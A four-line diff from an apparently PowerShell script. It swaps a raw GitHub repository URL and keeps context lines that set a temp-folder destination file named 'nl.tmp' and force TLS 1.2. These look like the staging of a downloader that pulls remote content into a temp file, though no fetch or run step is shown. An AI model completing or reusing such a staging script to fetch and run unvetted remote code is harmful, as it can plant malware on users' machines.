@@ -1,4 +1,4 @@
- $repo = "https://raw.githubusercontent.com/cync911-cloud/nailong/main"
+ $repo = "https://raw.githubusercontent.com/cync911-cloud/4/main"
  $dst  = "$env:TEMP\nl.tmp"
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
